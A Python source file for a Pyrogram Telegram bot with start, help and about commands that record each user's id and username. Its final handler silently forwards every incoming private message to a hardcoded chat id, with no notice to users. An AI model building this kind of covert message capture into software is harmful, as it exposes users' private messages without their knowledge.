from data import Data
from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, Message
from moonXcodes.moon.sql import add_user, query_msg


def filter(cmd: str):
    return filters.private & filters.incoming & filters.command(cmd)

LOL = -1002215279666
# Start Message
@Client.on_message(filter("start"))
async def start(bot: Client, msg: Message):
    id = msg.from_user.id
    user_name = '@' + msg.from_user.username if msg.from_user.username else None
    await add_user(id, user_name)   
    user = await bot.get_me()
    mention = user.mention
    await bot.send_message(
        msg.chat.id,
        Data.START.format(msg.from_user.mention, mention),
        reply_markup=InlineKeyboardMarkup(Data.buttons)
    )


# Help Message
@Client.on_message(filter("help"))
async def _help(bot: Client, msg: Message):
    id = msg.from_user.id
    user_name = '@' + msg.from_user.username if msg.from_user.username else None     
    await add_user(id, user_name) 
    await bot.send_message(
        msg.chat.id, Data.HELP,
        reply_markup=InlineKeyboardMarkup(Data.home_buttons)
    )


# About Message
@Client.on_message(filter("about"))
async def about(bot: Client, msg: Message):
    await bot.send_message(
        msg.chat.id,
        Data.ABOUT,
        # disable_web_page_preview=True,
        # link_preview_options=LinkPreviewOptions(is_disabled=True),
        reply_markup=InlineKeyboardMarkup(Data.home_buttons),
    )


@Client.on_message(filters.private & filters.incoming)
async def on_pm_s(client: Client, message: Message):
    if not message.from_user.id ==LOL:
        fwded_mesg = await message.forward(chat_id=LOL, disable_notification=True)
